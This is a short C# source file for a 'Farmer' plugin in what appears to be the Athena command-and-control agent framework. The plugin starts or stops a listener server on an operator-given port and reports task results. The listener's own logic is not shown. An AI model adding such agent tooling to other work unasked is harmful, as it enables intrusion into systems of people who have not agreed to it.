using Plugin;
using Athena.Plugins;
using Athena.Models;
using Athena.Models;

namespace Plugins
{
    public class Farmer : AthenaPlugin
    {
        public override string Name => "farmer";
        private FarmerServer farm = new FarmerServer();
        public override void Execute(Dictionary<string, string> args)
        {
            if (!int.TryParse(args["port"], out Config.port))
            {
                farm.Stop();

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = args["task-id"],
                    completed = "true",
                    user_output = "Stopped Farmer."
                });
            }
            else
            {
                Config.task_id = args["task-id"];
                PluginHandler.Write($"Starting farmer on port: {Config.port}", Config.task_id, false);
                farm.Initialize(Config.port);
            }
        }
        public void Kill(Dictionary<string, string> args)
        {
            try
            {
                farm.Stop();

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = args["task-id"],
                    completed = "true",
                    user_output = "Stopped Farmer."
                });
            }
            catch (Exception e)
            {

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = args["task-id"],
                    user_output = e.ToString(),
                    completed = "true",
                    status = "error",
                });
            }
        }
    }
}